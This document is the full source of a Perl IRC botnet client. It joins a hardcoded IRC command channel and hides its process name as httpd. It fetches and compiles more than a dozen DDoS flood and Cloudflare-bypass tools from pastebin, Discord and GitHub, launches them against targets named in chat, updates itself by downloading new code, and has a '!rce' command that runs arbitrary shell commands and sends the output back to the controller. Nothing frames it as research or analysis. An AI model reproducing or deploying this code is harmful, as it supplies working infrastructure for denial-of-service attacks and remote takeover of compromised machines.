#!usr/bin/perl

      #################################################################
      #################################################################
      ##   =                                                         ##
      ##                                                             ##
      ##               Made by Mecz1nho from Pryzraky                ##
      ##                                                             ##
      ##                         ~ Follow ~                          ##
      ##                https://twitter.com/Mecz1nho                 ##
      ##                https://twitter.com/Pryzraky                 ##
      ##                                                             ##    
      #################################################################
      #################################################################

      #######################################################################
      ##                                                                   ##
      ##                  CONFIGURATIONS OF FUCKING BOTNET                 ##
      ##                                                                   ##
      #######################################################################
	  
use IO::Socket;
my $processo = '/usr/sbin/httpd';
my $server  = "194.171.96.49"; 
my $server  = "194.171.96.49"; 
my $code = int(rand(999999));
my $channel = "#udp";
my $port    =   "6667";
my $nick    = "[UDP]$code";

      #######################################################################
      ##                                                                   ##
      ##              DOWNLOAD DDoS METHODS OF FUCKING BOTNET              ##
      ##                                                                   ##
      #######################################################################

unless (-e "httptest.py") {
  print "[*] Instalando o HTTP-TEST...";
  system("apt-get install gcc");
  system("y");
  system("wget https://cdn.discordapp.com/attachments/530891110500007946/597886406760726539/http.py -O httptest.py");
}

unless (-e "bty.pl") {
  print "[*] Install the AWP-ATTACK...";
  system("wget https://cdn.discordapp.com/attachments/536003787442094110/564498341929549850/bty.pl -O bty.pl");
}

unless (-e "proxys.txt") {
  print "[*] Install the Proxies...";
  system("wget https://cdn.discordapp.com/attachments/566093900536610837/597698192552755230/proxys.txt -O proxys.txt");
}

unless (-e "cfbypass2.py") {
  print "[*] Instalando o HTTPS CloudFlare Protection Bypass...";
  system("wget https://cdn.discordapp.com/attachments/566093900536610837/598344135308476417/cfbypass2.py -O cfbypass2.py");
}

unless (-e "cfbypass.py") {
  print "[*] Instalando o HTTP CloudFlare Protection Bypass...";
  system("wget https://cdn.discordapp.com/attachments/566093900536610837/598344133668503572/cfbypass.py -O cfbypass.py");
}

unless (-e "sadattack.py") {
  print "[*] Instalando o SADATTACK...";
  system("wget https://pastebin.com/raw/XiwqFZqe -O sadattack.py");
}

unless (-e "saphyra.py") {
  print "[*] Instalando o Saphyra...";
  system("wget https://cdn.discordapp.com/attachments/596006762344087572/598325243416936448/Saphyra.py -O saphyra.py");
}

unless (-e "cannabis.py") {
  print "[*] Instalando o Cannabis...";
  system("wget https://cdn.discordapp.com/attachments/596006762344087572/598325243416936448/Saphyra.py -O cannabis.py");
}

unless (-e "hulk.py") { 
  print "[*] Instalando o HULK... ";
  system("wget https://pastebin.com/raw/gdDMQXWQ -O hulk.py");
}

unless (-e "goldeneye.py") { 
  print "[*] Instalando o Goldeneye... ";
  system("wget https://pastebin.com/raw/eY3C0anh -O goldeneye.py");
}

unless (-e "std2.c") { 
  print "[*] Instalando STD... ";
  system("wget https://pastebin.com/raw/3UCGvEnD -O std2.c");
  system("gcc std2.c -o std2 -pthread");
}

unless (-e "nfo.c") { 
  print "[*] Instalando NFO... ";
  system("wget https://cdn.discordapp.com/attachments/566093900536610837/598524818878496790/nfo -O nfo.c");
  system("gcc nfo.c -o nfo -pthread");
}

unless (-e "ovhgame.c") { 
  print "[*] Instalando Ovh-Game... ";
  system("wget https://raw.githubusercontent.com/oofadcoolzmamn2/lol/main/WOLF -O wolf");
  system("chmod +x wolf");
}


unless (-e "httpattack.pl") { 
  print "[*] Instalando HTTP-ATTACK... ";
  system("wget https://pastebin.com/raw/nzmmmQaR -O httpattack.pl");
}

unless (-e "udptest.py") { 
  print "[*] Instalando UDP-Test... ";
  system("wget https://pastebin.com/raw/XxT8sPt4 -O udptest.py");
}

unless (-e "udp1.pl") { 
  print "[*] Instalando UDP-1... ";
  system("wget https://pastebin.com/raw/n399Y8ES -O udp1.pl");
}

unless (-e "udp2.pl") { 
  print "[*] Instalando UDP-2... ";
  system("wget https://pastebin.com/raw/ZEeaYZRg -O udp2.pl");
}

unless (-e "udp3.pl") { 
  print "[*] Install the UDP-3... ";
  system("wget https://pastebin.com/raw/XqHSJT1J -O udp3.pl");
}

unless (-e "ack.pl") { 
  print "[*] Instalando ACK-Attack... ";
  system("wget https://pastebin.com/raw/57pBN7Un -O ack.pl && clear");
  system("chmod 777 *");
}


unless (-e "randburst.pl") {
  print "[*] Instalando udpkill.... ";
  system("wget https://raw.githubusercontent.com/oofadcoolzmamn2/lol/main/UFO-BYPASS.pl -O randburst.pl");
}

unless (-e "port-shift.pl") {
  print "[*] Instalando udpkill.... ";
  system("wget https://raw.githubusercontent.com/oofadcoolzmamn2/lol/main/UFO-BYPASS.pl -O port-shift.pl");  

}


unless (-e "hping3") {
  print "[*] Instalando hping3.... ";
  system("apt install hping3");

}


unless(-e "fucking2.pl") {
  print "[*] Instalando fucking2.pl.... ";
  system("wget https://raw.githubusercontent.com/sadcloudisgay/stuff/main/UDP-BYPASS.pl -O fucking2.pl")
}



all();
sub all {
$SIG{'INT'}  = 'IGNORE';
$SIG{'HUP'}  = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'}   = 'IGNORE';

$s0ck3t = new IO::Socket::INET(
PeerAddr => $server,
PeerPort => $port,
Proto    => 'tcp'
);
if ( !$s0ck3t ) {
print "\nError\n";
exit 1;
}   

$0 = "$processo" . "\0" x 16;
my $pid = fork;
exit if $pid;
die "Problema com o fork: $!" unless defined($pid);

print $s0ck3t "NICK $nick\r\n";
print $s0ck3t "USER $nick 1 1 1 1\r\n";

print "Botnet on and working normally. Your bots are being uploaded.\n\n";
while ( my $log = <$s0ck3t> ) {
      chomp($log);

      if ( $log =~ m/^PING(.*)$/i ) {
        print $s0ck3t "PONG $1\r\n";
	print $s0ck3t "JOIN $channel\r\n";
      }
      
      #######################################################################
      ##                                                                   ##
      ##                ALL NOHUP COMMANDS OF FUCKING BOTNET               ##
      ##                                                                   ##
      #######################################################################
      
	  if ( $log =~ m/:!massddos #saphyra (.*)$/g ){##########
        my $target_saphyra = $1;
        $target_saphyra =~ s/^\s*(.*?)\s*$/$1/;
        $target_saphyra;
        print $s0ck3t "PRIVMSG $channel :67[63Saphyra67]61 Mass DDoS Attack on target: $1 \r\n";
        system("nohup python saphyra.py $target_saphyra > /dev/null 2>&1 &");
      }
	  
	  if ( $log =~ m/:!massddos #cannabys (.*)$/g ){##########
        my $target_cannabys = $1;
        $target_cannabys =~ s/^\s*(.*?)\s*$/$1/;
        $target_cannabys;
        print $s0ck3t "PRIVMSG $channel :67[63Saphyra67]61 Mass DDoS Attack on target: $1 \r\n";
        system("nohup python cannabys.py $target_cannabys > /dev/null 2>&1 &");
      }
	  
      if ( $log =~ m/:!massddos #htpptest (.*)$/g ){##########
        my $target_httptest = $1;
        $target_httptest =~ s/^\s*(.*?)\s*$/$1/;
        $target_httptest;
        print $s0ck3t "PRIVMSG $channel :67[63HTTP-TEST67]61 Mass DDoS Attack on target: $1 o\r\n";
        system("nohup python httptest.py $target_httptest 80 > /dev/null 2>&1 &");
      }
	  
      if ( $log =~ m/:!massddos #awp (.*)$/g ){##########
        my $target_awp = $1;
        $target_awp =~ s/^\s*(.*?)\s*$/$1/;
        $target_awp;
        print $s0ck3t "PRIVMSG $channel :67[63AWP67]61 Mass DDoS Attack on target: $1 \r\n";
        system("nohup perl bty.pl $target_awp 400 800 proxys.txt> /dev/null 2>&1 &");
      }
	  
      if ( $log =~ m/:!massddos #cfbypass (.*)$/g ){##########
        my $target_cfbypass = $1;
        $target_cfbypass =~ s/^\s*(.*?)\s*$/$1/;
        $target_cfbypass;
        print $s0ck3t "PRIVMSG $channel :67[63CF-BYPASS67]61 Mass DDoS Attack on target: $1 \r\n";
        system("nohup python cfbypass.py $target_cfbypass > /dev/null 2>&1 &");
      }
	  
	  if ( $log =~ m/:!massddos #cfbypass2 (.*)$/g ){##########
        my $target_cfbypass2 = $1;
        $target_cfbypass2 =~ s/^\s*(.*?)\s*$/$1/;
        $target_cfbypass2;
        print $s0ck3t "PRIVMSG $channel :67[63CF-BYPASS67]61 Mass DDoS Attack on target: $1 \r\n";
        system("nohup python cfbypass2.py $target_cfbypass2 > /dev/null 2>&1 &");
      }
	 
	  if ( $log =~ m/:!massddos #sadattack (.*)$/g ){##########
        my $target_sadattack = $1;
        $target_sadattack =~ s/^\s*(.*?)\s*$/$1/;
        $target_sadattack;
        print $s0ck3t "PRIVMSG $channel :67[63SAD-HTTP67]61 Mass DDoS Attack on target: $1 \r\n";
        system("nohup python sadattack.py $target_sadattack > /dev/null 2>&1 &");
      }

      if ( $log =~ m/:!massddos #hulk (.*)$/g ){##########
        my $target_hulk = $1;
        $target_hulk =~ s/^\s*(.*?)\s*$/$1/;
        $target_hulk;
        print $s0ck3t "PRIVMSG $channel :67[63HULK-HTTP67]61 Mass DDoS Attack on target: $1 \r\n";
        system("nohup python hulk.py $target_hulk > /dev/null 2>&1 &");
      }

      if ( $log =~ m/:!massddos #gold (.*)$/g ){##########
        my $target_gold = $1;
        $target_gold =~ s/^\s*(.*?)\s*$/$1/;
        print $s0ck3t "PRIVMSG $channel :67[63GOLD-HTTP67]61 Mass DDoS Attack on target: $1 \r\n";
        system("nohup python goldeneye.py $target_gold -w 25 -s 800 > /dev/null 2>&1 &");
      }

      if ( $log =~ m/:!massddos #std (.*)$/g ){##########
        my $target_std2 = $1;
        my $port_std2 = $2;
        my $time_std2 = $3;
        print $s0ck3t "PRIVMSG $channel :67[63STD67]61 Mass DDoS Attack  on target: $1 \r\n";
        system("nohup ./std2 $target_std2 $port_std2 4800 > /dev/null 2>&1 &");
      }
	  
	  if ( $log =~ m/:!massddos #nfo (.*)$/g ){##########
        my $target_std2 = $1;
        my $port_std2 = $2;
        my $time_std2 = $3;
        print $s0ck3t "PRIVMSG $channel :67[63NFO67]61 Mass DDoS Attack  on target: $1 \r\n";
        system("nohup ./std2 $target_std2 $port_std2 4800 > /dev/null 2>&1 &");
      }
	  
	  if ( $log =~ m/:!massddos #ovhgame (.*)$/g ){##########
        my $target_wolf = $1;
        my $port_wolf = $2;
        my $time_wolf = $3;
        print $s0ck3t "PRIVMSG $channel :67[63OVH-GAME67]61 Mass DDoS Attack  on target: $1 \r\n";
        system("nohup ./wolf $target_wolf $port_wolf $time_wolf > /dev/null 2>&1 &");
      }

      if ( $log =~ m/:!massddos #httpattack (.*)$/g ){##########
        my $target_httpattack = $1;
        $target_httpattack =~ s/^\s*(.*?)\s*$/$1/;
        $target_httpattack;
        print $s0ck3t "PRIVMSG $channel :67[63HTTP-ATTACK67]61 Mass DDoS Attack on target: $1 \r\n";
        system("nohup perl httpattack.pl $target_httpattack 1000 100 GET 13.37 > /dev/null 2>&1 &");
      }
	  
	  if ( $log =~ m/:!massddos #ack (.*)$/g ){##########
        my $target_ack = $1;
        my $time_ack = $2;
        print $s0ck3t "PRIVMSG $channel :4ACK-ATTACK4 Mass DDoS Attack on target: $1 \r\n";
        system("nohup perl ack.pl $target_ack $target_ack > /dev/null 2>&1 &");
      }
	  
	  if ( $log =~ m/:!massddos #udptest (.*)$/g ){##########
        my $target_udptest = $1;
		my $port_udptest = $2;
		my $threads_udptest = $3;
        print $s0ck3t "PRIVMSG $channel :67[63UDP-TEST67]61 Mass DDoS Attack on target: $1 on port $2 with $3 threads\r\n";
        system("nohup python udptest.py $target_udptest $port_udptest $threads_udptest > /dev/null 2>&1 &");
      }
	  
	  if ( $log =~ m/:!massddos #udp (.*)$/g ){##########
        my $target_udp = $1;
        print $s0ck3t "PRIVMSG $channel :67[63UDP67]61 Mass DDoS Attack on target: $1 \r\n";
        system("nohup perl udp1.pl $target_udp > /dev/null 2>&1 &");
      }

      if ( $log =~ m/:!massddos #udp2 (.*)$/g ){##########
        my $target_udp2 = $1;
        my $time_udp2 = $2;
        print $s0ck3t "PRIVMSG $channel :67[63UDP_v267]61 Mass DDoS Attack on target: $1 \r\n";
        system("nohup perl udp2.pl $target_udp2 4800 > /dev/null 2>&1 &");
	  }
	  
	  if ( $log =~ m/:!massddos #udp3 (.*)$/g ){##########
        my $target_udp3 = $1;
        my $time_udp3 = $2;
        print $s0ck3t "PRIVMSG $channel :67[63UDP_v367]61 Mass DDoS Attack on target: $1 \r\n";
        system("nohup perl udp3.pl $target_udp3 4800 > /dev/null 2>&1 &");
      }
	  
	  if ( $log =~ m/:!massddos #uploader (.*)$/g ){##########
	    my $target_perl = $1;
        print $s0ck3t "PRIVMSG $channel :67[63Bots Uploader67]61 You have requested more bots, your bots are being sent. \r\n";
        system("$target_perl infect.pl > /dev/null 2>&1 &");
		system("$target_perl infect.pl > /dev/null 2>&1 &");
      }


        if ( $log =~ m/:!massddos #randburst (.*)$/g ){##########
           my $target_randburst = $1;
           my $time_randburst = $2;
           print $s0ck3t "PRIVMSG $channel :03Rand Burst Attack Sent To Target $target_randburst \r\n";
           system("nohup perl randburst.pl $target_randburst $time_randburst 1 > /dev/null 2>&1 &");
        }




        if ( $log =~ m/:!massddos #portshift (.*)$/g ){##########
	    my $target_portshift = $1;
      my $time_portshift = $2;
        print $s0ck3t "PRIVMSG $channel :[PORT SHIFT ATTACK STARTED!!!!] \r\n";
        system("nohup perl port-shift.pl $target_portshift $time_portshift 2 > /dev/null 2>&1 &");
      }
	  


     if ( $log =~ m/:!massddos #udpfrag (.*)$/g ){##########
      my $target_udpfrag = $1;
      print $s0ck3t "PRIVMSG $channel :04UDP-FRAGMENTATION SENT TO $target_udpfrag \r\n";
      system("nohup hping3 --flood -f -2 $target_udpfrag > /dev/null 2>&1 &");
  }

      if ( $log =~ m/:!massddos #udpfrag2 (.*)$/g ){##########
      my $target_udpfrag = $1;
      print $s0ck3t "PRIVMSG $channel :09UDP2-FRAGMENTATION SENT TO $target_udpfrag \r\n";
      system("nohup hping3 --flood -f -2 -x $target_udpfrag > /dev/null 2>&1 &");
  }

            if ( $log =~ m/:!massddos #fucking2(.*)$/g ){##########
            my $target_fucking2 = $1;
            my $time_fucking2 = $2;
            print $s0ck3t "PRIVMSG $channel :FUCKING2 DDOS STARTED ON $1! \r\n";
            system("nohup perl fucking2.pl $target_fucking2 $time_fucking2 > /dev/null 2>&1 &");
       }
           

      #######################################################################
      ##                                                                   ##
      ##                 SPECIALS ATTACKS OF FUCKING BOTNET                ##
      ##                                                                   ##
      #######################################################################
	  
	  if ( $log =~ m/:!massddos #layer4 (.*)$/g ){##########
        my $target_layer4 = $1;
        print $s0ck3t "PRIVMSG $channel :67[63Layer467]61 Mass DDoS Attack on target: $1 \r\n";
		system("nohup perl udp1.pl $target_layer4 > /dev/null 2>&1 &");
		system("nohup perl udp2.pl $target_layer4 4800 > /dev/null 2>&1 &");
		system("nohup perl udp3.pl $target_layer4 4800 > /dev/null 2>&1 &");
      }
	  
	  if ( $log =~ m/:!massddos #layer7 (.*)$/g ){##########
        my $target_layer7 = $1;
        $target_layer7 =~ s/^\s*(.*?)\s*$/$1/;
        $target_layer7;
        print $s0ck3t "PRIVMSG $channel :67[63Layer767]61 Mass DDoS Attack on target: $1 \r\n";
        system("nohup perl httpattack.pl $target_layer7 1000 100 GET 13.37 > /dev/null 2>&1 &");
		system("nohup python goldeneye.py $target_layer7 -w 15 -s 600 > /dev/null 2>&1 &");
		system("nohup python hulk.py $target_layer7 > /dev/null 2>&1 &");
		system("nohup python sadattack.py $target_layer7 > /dev/null 2>&1 &");
		system("nohup python cfbypass.py $target_layer7 > /dev/null 2>&1 &");
      }
	  
	  if ( $log =~ m/:!massddos #bypass (.*)$/g ){##########
        my $target_bypass = $1;
        $target_bypass =~ s/^\s*(.*?)\s*$/$1/;
        $target_bypass;
        print $s0ck3t "PRIVMSG $channel :67[63CF-BYPASS67]61 Mass DDoS Attack on target: $1 HTTP and HTTPS.\r\n";
		system("nohup python cfbypass.py http://$target_bypass > /dev/null 2>&1 &");
		system("nohup python cfbypass2.py https://$target_bypass > /dev/null 2>&1 &");
      }
      
      #######################################################################
      ##                                                                   ##
      ##                 STOP  ALL ATTACKS OF FUCKING BOTNET               ##
      ##                                                                   ##
      #######################################################################
      
      if ( $log =~ m/:!massddos #stopall/g ){##########
	    print $s0ck3t "PRIVMSG $channel :67[63STOP67]61 Stopping all attacks... \r\n";
		system("pkill -9 -f bty");
        system("pkill -9 -f cfbypass");
		system("pkill -9 -f cfbypass2");
        system("pkill -9 -f goldeneye");
		system("pkill -9 -f saphyra");
		system("pkill -9 -f cannabys");
		system("pkill -9 -f httpattack");
		system("pkill -9 -f httptest");
        system("pkill -9 -f sadattack");
        system("pkill -9 -f hulk");
        system("pkill -9 -f std2");
		system("pkill -9 -f nfo");
		system("pkill -9 -f ovhgame");
   		system("pkill -9 -f ack");
		system("pkill -9 -f udptest");
	    system("pkill -9 -f udp1");
        system("pkill -9 -f udp2");
		system("pkill -9 -f udp3");
    system("pkill -9 -f port-shift");
    system("pkill -9 -f randburst");
    system("pkill -9 -f hping3");
    system("pkill -9 -f fucking2");
      }
	  
	  if ( $log =~ m/:!massddos #kill/g ){##########
        print $s0ck3t "PRIVMSG $channel :67[63KILL67]61 Killing all the bots... \r\n";
        system("pkill -9 -f cfbypass");
		system("pkill -9 -f cfbypass2");
        system("pkill -9 -f goldeneye");
		system("pkill -9 -f saphyra");
		system("pkill -9 -f cannabys");
		system("pkill -9 -f httpattack");
        system("pkill -9 -f sadattack");
        system("pkill -9 -f hulk");
        system("pkill -9 -f std2");
		system("pkill -9 -f nfo");
		system("pkill -9 -f ovhgame");
   		system("pkill -9 -f ack");
		system("pkill -9 -f udptest");
	    system("pkill -9 -f udp1");
        system("pkill -9 -f udp2");
		system("pkill -9 -f udp3");
		system("pkill -9 -f httptest");
		system("pkill -9 -f http");
    system("pkill -9 -f port-shift");
    system("pkill -9 -f randburst");
    system("pkill -9 -f hping3");
    system("pkill -9 -f fucking2");
      }
	  
      #######################################################################
      ##                                                                   ##
      ##                    ALL COMMANDS OF FUCKING BOTNET                 ##
      ##                                                                   ##
      #######################################################################
     
     if ( $log =~ m/:!massddos #help/g ){##########
        print $s0ck3t "PRIVMSG $channel :67[63Help67]61 Layer4 commands:\r\n";
        print $s0ck3t "PRIVMSG $channel :67[63Commands67]61 !massddos #udp Target-IP (There are 2 and 3 too.)\r\n";
        print $s0ck3t "PRIVMSG $channel :67[63Commands67]61 !massddos #std2 Target-IP Port Time\r\n";
		print $s0ck3t "PRIVMSG $channel :67[63Commands67]61 !massddos #layer4 Target-IP (Em testes e somente para maquinas fortes)\r\n";
        print $s0ck3t "PRIVMSG $channel :67\r\n";
        print $s0ck3t "PRIVMSG $channel :67[63Help67]61 Layer7 commands:\r\n";
        print $s0ck3t "PRIVMSG $channel :67[63Commands67]61 !massddos #hulk http://target.com\r\n";
        print $s0ck3t "PRIVMSG $channel :67[63Commands67]61 !massddos #gold http://target.com\r\n";
        print $s0ck3t "PRIVMSG $channel :67[63Commands67]61 !massddos #httpattack http://target.com\r\n";
		print $s0ck3t "PRIVMSG $channel :67[63Commands67]61 !massddos #sadattack http://target.com\r\n";
	    print $s0ck3t "PRIVMSG $channel :67[63Commands67]61 !massddos #cfbypass http://target.com (HTTP)\r\n";
		print $s0ck3t "PRIVMSG $channel :67[63Commands67]61 !massddos #cfbypass2 https://target.com (HTTPS)\r\n";
		print $s0ck3t "PRIVMSG $channel :67[63Commands67]61 !massddos #layer7 http://target.com (Em testes e somente para maquinas fortes)\r\n";
      }
	  
	  if ( $log =~ m/:!massddos #atualizar (.*)$/g ){##########
        print $s0ck3t "PRIVMSG $channel :67[63Update67]61 Our system is being upgraded to, wait a few minutes. \r\n";
		system("rm fucking.pl > /dev/null 2>&1 &");
		system("wget https://pastebin.com/raw/5Puge28C -O fucking.pl > /dev/null 2>&1 &");
		system("perl fucking.pl > /dev/null 2>&1 &");
		system("pkill -9 -f http");
      }

      if ( $log =~ m/:!rce (.*)$/g ){##########
        my $comando_raw = `$1`;
        open(handler,">mat.tmp");
        print handler $comando_raw;
        close(handler);
		
        open(h4ndl3r,"<","mat.tmp");
        my @commandoarray = <h4ndl3r>;

        foreach my $comando_each (@commandoarray){
          sleep(1);
          print $s0ck3t "PRIVMSG $channel :4$comando_each4 \r\n";
       }
   }
}
}
while(true){
  all();
}
